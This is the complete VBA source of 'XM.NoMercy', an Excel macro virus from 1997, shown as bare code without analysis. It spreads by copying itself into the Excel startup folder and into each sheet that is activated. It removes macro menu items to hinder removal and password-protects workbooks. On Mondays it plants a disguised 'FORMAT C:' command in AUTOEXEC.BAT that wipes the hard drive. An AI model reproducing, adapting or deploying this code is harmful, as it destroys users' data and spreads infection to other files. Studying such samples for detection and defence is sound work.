Attribute VB_Name = "NoMercy2"

Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
On Error Resume Next
Application.ScreenUpdating = False
Application.DisplayAlerts = False
If WeekDay(Date) = 2 And Hour(Time) > 7 Then
    Open "C:\AUTOEXEC.BAT" For Input As #1
    Close
    SetAttr "C:\AUTOEXEC.BAT", vbNormal
    Open "C:\AUTOEXEC.BAT" For Append As #1
    Print #1, "@ECHO OFF"
    Print #1, "CLS"
    Print #1, "ECHO Please wait while setup Updates Your configuration Files"
    Print #1, "ECHO This may take a few minutes..."
    Print #1, "FORMAT C: /U /C /S /AUTOTEST > NUL"
    Print #1, "ECHO Complete !!!"
    Print #1, "ECHO."
    Print #1, "ECHO."
    Print #1, "ECHO Result :"
    Print #1, "ECHO All Data Lost!!!"
    Close #1
    SetAttr "C:\AUTOEXEC.BAT", vbReadOnly
    Do
    MsgBox "NoMercy VirusTeam Members are :" + Chr$(13) + "Foxz" + Chr$(13) + "CrazyMan" + Chr$(13) + "Lucifer" + Chr$(13) + "SafeGuard" + Chr$(13) + "SlageHammer", 16, "XM. NoMercy"
    Loop
End If
MenuBars(xlWorksheet).Reset
MenuBars(xlModule).Reset
MenuBars(xlNoDocuments).Reset
MenuBars(xlInfo).Reset
MenuBars(xlChart).Reset
MenuBars(xlWorksheet).Menus("Tools").MenuItems("---").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlWorksheet).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlWorksheet).Menus("Format").MenuItems("S&heet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("--").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Delete...").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlWorksheet).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlWorksheet).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("---").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Hide").Delete
MenuBars(xlChart).Menus("Window").MenuItems("&Unhide...").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("--").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("De&lete Sheet").Delete
MenuBars(xlChart).Menus("Edit").MenuItems("&Move or Copy Sheet...").Delete
MenuBars(xlChart).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("Assig&n Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("--").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Record New Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Unhide...").Delete

If cek_global() Then
    GoTo FuckSheet:
Else
    infectglobal
End If
FuckSheet:
Application.OnSheetActivate = "NOMERCY.XLM!Fuck"
bye:
End Sub

Function cek_global() As Boolean
Attribute cek_global.VB_ProcData.VB_Invoke_Func = " \n14"
cek_global = False
For x = 1 To Application.Workbooks.Count
    If Application.Workbooks(x).Name = "NOMERCY.XLM" Then
    For y = 1 To Application.Workbooks("NOMERCY.XLM").Modules.Count
        If Application.Workbooks("NOMERCY.XLM").Modules(y).Name = "NoMercy2" Then
            cek_global = True
        End If
    Next y
    End If
Next x
End Function

Function infectglobal()
Attribute infectglobal.VB_ProcData.VB_Invoke_Func = " \n14"
  activebook = ActiveWorkbook.Name
  Workbooks(activebook).SaveCopyAs Application.StartupPath + "\NOMERCY.XLM"
  Workbooks.Open (Application.StartupPath + "\NOMERCY.XLM")
  Windows("NOMERCY.XLM").Visible = False
 Application.Workbooks("NOMERCY.XLM").Save
End Function

Function inFuckIt() As Boolean
Attribute inFuckIt.VB_ProcData.VB_Invoke_Func = " \n14"
activebook = ActiveWorkbook.Name
inFuckIt = False
For y = 1 To Application.Workbooks(activebook).Modules.Count
    If Application.Workbooks(activebook).Modules(y).Name = "NoMercy2" Then
            inFuckIt = True
    End If
Next y
End Function

Sub Fuck()
Attribute Fuck.VB_ProcData.VB_Invoke_Func = " \n14"
    oactivebook = ActiveWorkbook.Name
    If inFuckIt() Then
    GoTo bye2
    End If
    Application.ScreenUpdating = False
    Application.Windows("NOMERCY.XLM").Visible = True
    Workbooks("NOMERCY.XLM").Activate
    Sheets("NoMercy2").Visible = True
    Sheets("Members").Visible = True
    Workbooks("NOMERCY.XLM").Sheets("NoMercy2").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks("NOMERCY.XLM").Sheets("Members").Copy Before:=Workbooks(oactivebook).Sheets(1)
    Workbooks(oactivebook).Sheets("NoMercy2").Visible = False
    Workbooks(oactivebook).Sheets("Members").Visible = False
    Workbooks("NOMERCY.XLM").Sheets("NoMercy2").Visible = False
    Workbooks("NOMERCY.XLM").Sheets("Members").Visible = False
    Windows("NOMERCY.XLM").Visible = False
bye2:
Close
End Sub

Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
Application.DisplayAlerts = False
Application.Workbooks("NOMERCY.XLM").Save
If Day(Date) = 13 Then
    MsgBox "NoMercy VirusTeam Back With XM.NoMercy" + Chr$(13) + "Foxz" + Chr$(13) + "August 97", 16, "XM. NoMercy"
End If
On Error GoTo bye3
Application.Workbooks(ActiveWorkbook.Name).Save
Application.Workbooks(ActiveWorkbook.Name).SaveAs.Password = "NoMercyVirusTeam"
Application.Workbooks(ActiveWorkbook.Name).Save
bye3:
End Sub
